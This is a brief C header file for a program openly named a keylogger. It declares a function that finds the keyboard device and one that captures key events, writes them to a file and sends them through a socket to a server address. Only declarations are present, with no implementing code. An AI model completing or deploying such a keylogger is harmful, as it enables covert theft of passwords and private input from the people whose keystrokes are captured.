#ifndef KEYLOGGER
#define KEYLOGGER
#include <stdio.h>

char *find_keyboard();
void capture_keys(FILE *file, char *event, int socket_desc, struct sockaddr_in server_addr);

#endif
